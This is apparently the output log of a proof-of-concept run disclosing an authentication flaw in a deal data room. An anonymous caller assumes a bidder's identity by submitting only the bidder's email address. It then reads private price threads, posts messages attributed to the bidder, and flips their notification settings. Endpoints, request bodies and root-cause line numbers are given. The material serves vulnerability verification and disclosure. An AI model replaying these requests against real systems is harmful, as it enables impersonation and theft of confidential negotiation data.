@@ -1,0 +1,69 @@
+PATH A — unauthenticated identity assumption   link=cmukykgxj002vmqv34iveg3hq   marker=PATHA-1790587163771
+
+A0  Discover the room from the link URL alone. No credentials.
+    GET /_next/data/.../view/cmukykgxj002vmqv34iveg3hq.json -> HTTP 200
+  [VULN PASS] the link URL alone yields dataroomId, unauthenticated  dataroomId=cmuk2443f0001mqpj7hewx5fa
+  [NOTE] groupId also disclosed  cmuk24451000jmqpjdxuuqbmf
+
+GT  Ground truth: who the genuine bidder is, read from the database.
+    link   : audience=GROUP emailAuth=false created=2026-09-28T08:01:05.715Z
+    viewer : cmuk25nib0001mqqibzl5gaem verified=true created=2026-09-27T16:53:46.691Z
+  [CTRL PASS] the target is a real Viewer row in the seller's team  cmuk25nib0001mqqibzl5gaem
+  [CTRL PASS] that viewer is a genuinely invited group member  1 group membership row(s)
+  [CTRL PASS] the viewer predates the attacked link, so the attacker did not create it  2026-09-27T16:53:46.691Z < 2026-09-28T08:01:05.715Z
+  [CTRL PASS] the link is at the configuration under test (GROUP, emailAuthenticated false)  GROUP/false
+
+A1  Control: the email gate refuses people who were not invited.
+  [CTRL PASS] a stranger address is refused  HTTP 403
+  [NOTE] a non-member at the bidder's own domain is also refused  HTTP 403 — the oracle is per-address, not per-domain
+
+A2  Assume the bidder's identity. ONE unauthenticated request.
+    POST /api/views-dataroom {email: "bidder-a@acquirer-alpha.test"} -> HTTP 200
+      viewerId=cmuk25nib0001mqqibzl5gaem  viewId=cmul1dq7c006bmqv35s0j9qaf  room="Project Falcon"
+  [VULN PASS] entry is granted on a self-asserted address, with no verification
+  [VULN PASS] the response returns the GENUINE bidder's canonical viewerId  returned cmuk25nib0001mqqibzl5gaem == ground truth cmuk25nib0001mqqibzl5gaem
+  [NOTE] root cause  views-dataroom:772-781 resolves Viewer by the teamId_email unique key
+  [NOTE] this step is LOUD — it creates a View row and notifies the seller  View rows 9 -> 10; DATAROOM_VIEW defaults to {IMMEDIATE, ALL}
+
+A3  Read the bidder's private threads. No cookie, no session.
+    anonymous GET -> HTTP 200, 2 thread(s), 2 PRIVATE
+      "Bidder A - price discussion" [PRIVATE]
+        > VICTIM-ASSET: our board will not approve above 71M. Can you move on the earn-out?
+        > SELLER-REPLY: we can flex the earn-out to 3 years if you clear diligence by Friday.
+        > PATHA-1790582612457: we are prepared to raise our offer.
+      "Bidder A private diligence" [PRIVATE]
+        > CONFIDENTIAL JF-CHAIN-1790543069031: our walk-away price is 71M
+  [VULN PASS] threads marked PRIVATE are returned to an unauthenticated caller  2 with visibilityMode === "PRIVATE"
+  [VULN PASS] the thread contains messages the attacker did not write  2 pre-existing message(s)
+  [VULN PASS] the read leaves no trace anywhere in the schema  0 row changes across 79 tables
+
+A4  Post a message as that bidder. Anonymous.
+    POST /api/conversations/messages -> HTTP 500
+  [NOTE] 500 attributed  You need to set the TRIGGER_SECRET_KEY environment variable. See https://trigger — thrown AFTER the write
+    database: row cmul1drpe006dmqv3fx3nl8z7 attributed to bidder-a@acquirer-alpha.test
+  [VULN PASS] an anonymous message is stored in the victim's private thread  cmul1drpe006dmqv3fx3nl8z7
+  [VULN PASS] it is attributed to the genuine bidder, not to an anonymous author  viewerId=cmuk25nib0001mqqibzl5gaem userId=null
+
+A5  Flip the victim's notification setting. Anonymous, both directions.
+    false --(HTTP 200)--> true --(HTTP 200)--> false
+  [VULN PASS] an anonymous caller writes another viewer's notification setting  verified in both directions, original value false restored
+  [NOTE] a 200 here always means the write landed  toggleNotificationsForConversation is a bare update on the composite key; a missing row throws P2025 -> 500
+
+A6  Does disabling the Q&A channel close the hole?
+  [SKIP] Q&A-disabled persistence  not tested here — this run needs Q&A on. Round 3 proved it separately: GET / checks only dataroomId and participation (conversations-route.ts:19-71). Current state: room.conversationsEnabled=true, link.enableConversation=true
+
+A7  Enumeration, and what it costs.
+  [SKIP] 60-probe unthrottled enumeration  not re-run here to avoid flooding the seller's notifications. Round 3 measured it: 60 probes, one IP, 104s, zero 429s; ratelimit() first appears at views-dataroom:555, after the denials at :507/:539. Each denial fires reportDeniedAccessAttempt with BLOCKED_ACCESS defaulting to {IMMEDIATE, ALL}.
+
+========================================================================
+PATH A — PATHA-1790587163771
+========================================================================
+  vulnerability assertions : 9 proven, 0 not proven   <- the finding
+  controls                 : 5 held, 0 failed          <- baseline only
+  observations             : 6
+  skipped                  : 2
+
+  Not demonstrated in this run:
+    - Q&A-disabled persistence: not tested here — this run needs Q&A on. Round 3 proved it separately: GET / checks only dataroomId and participation (conversations-route.ts:19-71). Current state: room.conversationsEnabled=true, link.enableConversation=true
+    - 60-probe unthrottled enumeration: not re-run here to avoid flooding the seller's notifications. Round 3 measured it: 60 probes, one IP, 104s, zero 429s; ratelimit() first appears at views-dataroom:555, after the denials at :507/:539. Each denial fires reportDeniedAccessAttempt with BLOCKED_ACCESS defaulting to {IMMEDIATE, ALL}.
+
